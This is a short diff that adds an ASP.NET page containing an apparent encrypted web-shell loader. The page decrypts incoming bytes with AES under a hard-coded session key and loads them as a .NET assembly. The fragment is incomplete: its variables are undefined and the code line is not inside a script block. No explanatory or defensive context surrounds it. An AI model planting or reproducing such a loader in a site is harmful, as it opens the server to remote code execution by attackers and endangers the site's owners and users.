@@ -1,0 +1,3 @@
+<%@ Page Language="C#" %>
+Assembly.Load(new RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(b, 0, b.Length)); Session["k"] = "e45e329feb5d925b";
+
